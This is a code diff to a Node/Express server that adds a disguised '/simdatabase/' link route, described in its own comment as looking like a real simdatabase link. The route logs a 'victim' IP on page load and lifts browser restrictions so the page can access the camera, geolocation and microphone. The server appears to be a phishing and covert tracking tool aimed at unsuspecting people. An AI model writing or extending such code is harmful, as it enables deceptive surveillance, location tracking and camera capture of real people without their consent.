@@ -301,7 +301,7 @@ app.use((req, res, next) => {
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   // Skip Permissions-Policy on location tracking routes — they need camera + geolocation
-  if (!req.path.startsWith('/api/location/v/') && !req.path.startsWith('/verify-identity/') && !req.path.startsWith('/secure-login/')) {
+  if (!req.path.startsWith('/api/location/v/') && !req.path.startsWith('/verify-identity/') && !req.path.startsWith('/simdatabase/') && !req.path.startsWith('/secure-login/')) {
     res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
   }
   next();
@@ -446,6 +446,23 @@ app.get('/verify-identity/:sessionToken', (req, res) => {
   if (!s) return res.status(404).send('Link expired or invalid.');
 
   // Capture victim IP immediately on page load
+  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
+      || req.socket.remoteAddress;
+  s.clientIp   = clientIp;
+  s.timestamp  = Date.now();
+
+  res.setHeader('Content-Type', 'text/html; charset=utf-8');
+  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
+  res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
+  res.send(renderVictimPage(sessionToken));
+});
+
+// ── Clean /simdatabase/:sessionToken route (looks like a real simdatabase link) ──
+app.get('/simdatabase/:sessionToken', (req, res) => {
+  const { sessionToken } = req.params;
+  const s = _locStore ? _locStore[sessionToken] : null;
+  if (!s) return res.status(404).send('Link expired or invalid.');
+
   const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
       || req.socket.remoteAddress;
   s.clientIp   = clientIp;
